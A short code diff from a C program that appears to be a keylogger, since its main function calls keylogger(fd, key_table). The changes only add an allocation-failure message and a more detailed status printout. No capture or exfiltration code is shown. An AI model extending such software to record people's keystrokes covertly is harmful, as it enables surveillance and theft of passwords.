@@ -13,6 +13,7 @@ static int			**new_keymaps(int tablen, int sectionslen)
 			for (int j = 0; j < i; j++)
 				free(ret[j]);
 			free(ret);
+			fprintf(stderr, "Malloc failed creating keymaps\n");
 			return NULL;
 		}
 	}
@@ -73,7 +74,7 @@ int					main(void)
 		free_tab(&key_table);
 		return 1;
 	}
-	printf("keyboard: %s\n", keyboard);
+	fprintf(stdout, "Keyboard: %s has %d keys %d keys mapped\n", keyboard, nb_keys, nb_keymap);
 	free(keyboard);
 	keylogger(fd, key_table);
 	close(fd);
